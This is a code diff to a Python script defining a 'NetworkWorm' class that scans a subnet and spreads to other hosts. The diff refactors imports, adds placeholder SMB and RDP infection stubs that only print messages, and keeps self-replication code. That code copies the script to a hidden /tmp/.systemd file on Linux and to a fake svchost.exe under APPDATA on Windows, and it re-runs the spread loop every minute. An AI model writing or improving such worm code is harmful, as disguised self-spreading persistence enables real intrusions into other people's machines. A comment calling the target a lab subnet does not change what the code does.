@@ -2,12 +2,12 @@ import os
 import sys
 import socket
 import threading
-from concurrent.futures import ThreadPoolExecutor
-
 import paramiko
 import subprocess
 from pathlib import Path
 from time import sleep
+from concurrent.futures import ThreadPoolExecutor
+import ipaddress
 
 # Configuration
 SCAN_SUBNET = "192.168.1.0/24"  # Your lab subnet
@@ -31,12 +31,10 @@ class NetworkWorm:
         """Main propagation method"""
         print("[*] Starting network scan...")
         self.scan_network()
-        self.infect_discovered_hosts()
-        self.execute_payload()
+        self.execute_payload()  # Removed redundant infect_discovered_hosts call
 
     def scan_network(self):
         """Discover vulnerable hosts in subnet"""
-        import ipaddress
         network = ipaddress.ip_network(SCAN_SUBNET)
 
         with ThreadPoolExecutor(max_workers=10) as executor:
@@ -96,6 +94,14 @@ class NetworkWorm:
             except:
                 continue
 
+    def infect_via_smb(self, ip):
+        """SMB infection simulation (placeholder)"""
+        print(f"[*] Simulating SMB infection on {ip}")
+
+    def infect_via_rdp(self, ip):
+        """RDP infection simulation (placeholder)"""
+        print(f"[*] Simulating RDP infection on {ip}")
+
     def is_already_infected(self, ip):
         """Check infection marker"""
         try:
@@ -122,12 +128,9 @@ class NetworkWorm:
     def self_replicate(self):
         """Copy self to vulnerable locations"""
         try:
-            # Linux persistence
             if os.name == 'posix':
-                os.system("cp {} /tmp/.systemd".format(sys.argv[0]))
+                os.system(f"cp {sys.argv[0]} /tmp/.systemd")
                 os.system("chmod +x /tmp/.systemd")
-
-            # Windows persistence
             elif os.name == 'nt':
                 appdata = os.getenv('APPDATA')
                 os.system(f"copy {sys.argv[0]} {appdata}\\System32\\svchost.exe")
@@ -152,4 +155,4 @@ if __name__ == "__main__":
     while True:
         worm.stop_worm()
         worm.spread()
-        sleep(60)
+        sleep(60)  # Propagate every minute
